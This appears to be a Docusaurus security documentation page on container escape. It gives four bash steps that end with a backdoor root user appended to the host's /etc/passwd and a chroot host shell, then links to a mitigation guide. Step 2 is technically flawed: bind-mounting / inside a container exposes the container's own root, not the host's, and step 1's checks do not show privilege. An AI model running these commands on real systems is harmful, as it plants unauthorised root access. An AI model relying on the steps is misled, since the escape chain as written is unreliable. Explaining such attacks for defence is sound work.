---
sidebar_position: 7
title: "Container Escape"
description: "Understanding container escape vulnerabilities and how attackers break out of containers to compromise the host system."
---

# Container Escape

A **container escape** occurs when an attacker exploits vulnerabilities in a containerized environment to **break out of the container** and gain access to the **underlying host system**. This can lead to **privilege escalation, data exfiltration, and full cluster compromise**.

---

## Exploitation Steps: Breaking Out of a Container

An attacker gains access to a misconfigured or vulnerable container and attempts to escape to the host.

### Step 1: Identify the Environment

The attacker checks if the container is running as **privileged** or has access to the host filesystem:

```bash
cat /proc/1/cgroup
ls -la /root
```

If the output reveals unrestricted access, the attacker proceeds to escape.

### Step 2: Mount the Host Filesystem

The attacker attempts to mount the host filesystem inside the container:

```bash
mkdir /mnt/host
mount -o bind / /mnt/host
```

### Step 3: Escalate Privileges

If the container runs as root and `/mnt/host` is accessible, the attacker can create a new root user on the host:

```bash
echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
```

### Step 4: Gain a Host Shell

The attacker spawns a shell on the host system:

```bash
chroot /mnt/host /bin/bash
```

### Result

The attacker has escaped the container and now has **full access to the host**, enabling them to modify files, execute commands, and potentially compromise the entire cluster.

---

## Mitigation Steps

To prevent container escape vulnerabilities, follow the security best practices outlined in:

➡ **[Preventing Container Escape](/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation)**

This guide covers techniques such as **disabling privileged containers, restricting host filesystem access, enforcing least privilege principles, and applying security policies** to mitigate container escape risks.
